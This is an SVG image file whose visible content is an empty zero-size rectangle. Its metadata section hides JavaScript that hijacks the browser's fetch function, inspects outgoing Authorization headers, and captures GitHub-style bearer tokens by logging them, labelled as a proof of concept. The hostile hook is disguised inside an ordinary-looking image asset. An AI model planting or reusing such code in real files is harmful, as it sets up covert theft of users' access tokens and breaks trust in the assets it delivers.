<svg xmlns="http://www.w3.org/2000/svg">
  <metadata>
    <![CDATA[
      (function(){
        if (window.__BEARER_HOOKED__) return;
        window.__BEARER_HOOKED__ = true;
        const RX = /\bGitHub-Bearer\s+[A-Za-z0-9._-]{60,}\b/;
        const p = new Proxy(window.fetch, {
          async apply(t, th, args) {
            const [, init] = args;
            const h = init?.headers || {};
            const auth = h.authorization || h.Authorization || h.get?.('authorization');
            if (auth && RX.test(auth)) {
              console.log('%c[PoC token]', 'color:red;font-weight:bold;', auth);
            }
            return Reflect.apply(t, th, args);
          }
        });
        Object.defineProperty(window, 'fetch', { value: p });
      })();
    ]]>
  </metadata>
  <rect width="0" height="0"/>
</svg>
